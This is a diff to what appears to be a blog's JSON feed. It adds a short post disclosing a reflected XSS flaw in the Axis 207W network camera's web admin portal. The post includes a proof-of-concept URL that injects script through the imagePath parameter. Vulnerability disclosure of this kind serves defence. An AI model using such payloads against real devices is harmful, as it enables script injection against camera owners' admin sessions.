@@ -5,6 +5,17 @@
     "home_page_url": "http://example.com",
     "items": [
         {
+            "id": "http://example.com/2022/12/30/exploit-db-1/",
+            "url": "http://example.com/2022/12/30/exploit-db-1/",
+            "title": "exploit_db_1",
+            "date_published": "2022-12-30T03:25:20.000Z",
+            "content_html": "<h1 id=\"axis-207w-network-camera-xss-vulnerability\"><a class=\"markdownIt-Anchor\" href=\"#axis-207w-network-camera-xss-vulnerability\">#</a> Axis 207W Network Camera XSS Vulnerability</h1>\n<p>I have found a vulnerability in the Axis 207W Network Camera running firmware.</p>\n<p>Reflected XSS in web administration portal in Axis 2100 Network Camera allows attacker to execute arbitrary javascript via URL.</p>\n<p>POC Verified on Firefox 78.0:</p>\n<pre><code>http://xxx.xxx.xxx.xxx/view/view.shtml?id=461&amp;imagePath=%3C%2FsCrIpT%3E%3CsCrIpT%3Eipbtjgpgcc%3C%2FsCrIpT%3E&amp;size=1\n</code></pre>\n",
+            "tags": [
+                "xss",
+                "Vulnerability"
+            ]
+        },
+        {
             "id": "http://example.com/2022/07/02/AFL%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E5%88%9D%E6%8E%A2/",
             "url": "http://example.com/2022/07/02/AFL%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E5%88%9D%E6%8E%A2/",
             "title": "AFL基础学习",
